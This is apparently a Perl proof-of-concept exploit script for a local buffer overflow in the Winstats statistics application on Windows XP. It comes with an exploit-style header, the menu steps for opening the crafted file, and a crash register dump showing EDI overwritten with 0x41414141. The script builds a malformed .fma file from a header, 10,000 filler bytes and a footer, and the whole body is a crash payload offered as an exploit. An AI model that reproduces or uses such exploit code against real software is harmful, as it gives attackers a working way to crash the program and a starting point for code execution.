###################################################################
#Exploit Title : Winstats (.fma) local Buffer Overflow Poc
#tested on windows xp SP 3 FR
#Author: MadjiX
#Special Greets:His0k4 [ where are you :( ]
#Greets:Bibi-info , Silectovic , Volc4n0
#App: http://math.exeter.edu/rparris/peanut/wsfr32z.exe
###################################################################
#-->FenÃ¨tre-->1variable-->Fichier-->Ouvrir--> Open madjix.fma file
#Note:Open the file twice i dont no why
#EAX 0000060E
#ECX 00000000
#EDX 00D66898
#EBX 616D662E
#ESP 0012F74C
#EBP 0012F750
#ESI 00AD7AE0
#EDI 41414141
#EIP 00432675 wstatfr.00432675
#C 0  ES 0023 32bit 0(FFFFFFFF)
#P 1  CS 001B 32bit 0(FFFFFFFF)
#A 0  SS 0023 32bit 0(FFFFFFFF)
#Z 0  DS 0023 32bit 0(FFFFFFFF)
#S 0  FS 003B 32bit 7FFDF000(FFF)
#T 0  GS 0000 NULL
###################################################################
my $file= "MadjiX.fma";

my $hd = "\xB9\x01\x00\x00\x09\x00\x00\x00".
"\x50\x00\x00\x00\x5D\x00\x00\x00".
"\x00\x02\x00\x00\x00\x02\x00\x00".
"\x00\x00\x00\x00\x01\x00\x00\x00".
"\x3D\x00\x00\x00\xD9\xFF\xFF\xFF".
"\x2C\x01\x00\x00\x64\x00\x00\x00".
"\x64\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x0A";

my $ft = "\x0A\x00\x00\x00\x0A\x00\x00\x00\x0A\x00".
"\x00\x00\x0C\x00\x00\x00\xF0\xFF\xFF\xFF".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00".
"\x08\x02\x01\x31\x43\x6F\x75\x72\x69\x65".
"\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\xF3\xFF\xFF\xFF\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x90\x01\x00\x00\x00\x00\x00\x02\x08".
"\x02\x01\x31\x53\x79\x6D\x62\x6F\x6C\x00".
"\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\xF3\xFF\xFF\xFF\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x90\x01\x00\x00\x00\x00\x00\x00\x08".
"\x02\x01\x31\x43\x6F\x75\x72\x69\x65\x72".
"\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\xF5\xFF\xFF\xFF\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x90\x01\x00\x00\x00\x00\x00\x00\x08".
"\x02\x01\x31\x43\x6F\x75\x72\x69\x65\x72".
"\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\xF0\xFF\xFF\xFF\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x90\x01\x00\x00\x00\x00\x00\x00\x08".
"\x02\x01\x02\x54\x69\x6D\x65\x73\x00\x72".
"\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\xF5\xFF\xFF\xFF\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x90\x01\x00\x00\x00\x00\x00\x00\x08".
"\x02\x01\x31\x43\x6F\x75\x72\x69\x65\x72".
"\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\xF3\xFF\xFF\xFF\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x90\x01\x00\x00\x00\x00\x00\x00\x08".
"\x02\x01\x31\x43\x6F\x75\x72\x69\x65\x72".
"\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\xF3\xFF\xFF\xFF\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x09\x00\x10\x00\x00\x00\x00\x00\x00".
"\x80\x20\x13\x14\x36\xF7\x57\x26\x96\x57".
"\x22\x04\xE6\x57\x70\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00";

my $junk = "\x41" x 10000 ;

open($FILE,">$file");
print $FILE $hd.$junk.$ft;
close($FILE);